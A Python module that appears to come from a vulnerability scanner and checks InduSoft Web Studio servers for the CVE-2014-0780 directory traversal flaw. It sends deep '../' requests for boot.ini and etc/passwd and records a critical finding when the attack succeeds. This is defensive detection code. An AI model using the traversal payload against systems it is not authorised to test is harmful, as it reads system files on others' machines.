"""Agent Asteroid implementation for CVE-2014_0780."""

import requests
from requests import exceptions as requests_exceptions
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Indusoft Web Studio Directory Traversal."
VULNERABILITY_REFERENCE = "CVE-2014_0780"
VULNERABILITY_DESCRIPTION = (
    "Directory traversal vulnerability in NTWebServer in InduSoft Web Studio 7.1 "
    "before SP2 Patch 4 allows remote attackers to read administrative passwords "
    "in APP files, and consequently execute arbitrary code, via unspecified web requests."
)

DEFAULT_TIMEOUT = 90
DEPTH = 10


@exploits_registry.register
class CVE20140780Exploit(definitions.Exploit):
    """
    CVE-2014_0780: Indusoft Web Studio Directory Traversal.
    """

    def accept(self, target: definitions.Target) -> bool:
        try:
            self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return True

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        file_names = ["boot.ini", "etc/passwd"]
        for file_name in file_names:
            levels = "../" * DEPTH
            url = target.origin + f"/{levels}{file_name}"

            try:
                r = requests.Request(method="GET", url=url)
                prep = r.prepare()
                prep.url = url
                response = self.session.send(prep, timeout=DEFAULT_TIMEOUT)
            except requests_exceptions.RequestException:
                return []

            if response.status_code == 200 and "Sending file" in response.text:
                vulnerability = self._create_vulnerability(target)
                return [vulnerability]

        return []

    def _create_vulnerability(
        self, target: definitions.Target
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "exploit-db.com": "https://www.exploit-db.com/exploits/42699",
                "cisa.gov": "https://www.cisa.gov/news-events/ics-advisories/icsa-14-107-02",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor. \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target.origin} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
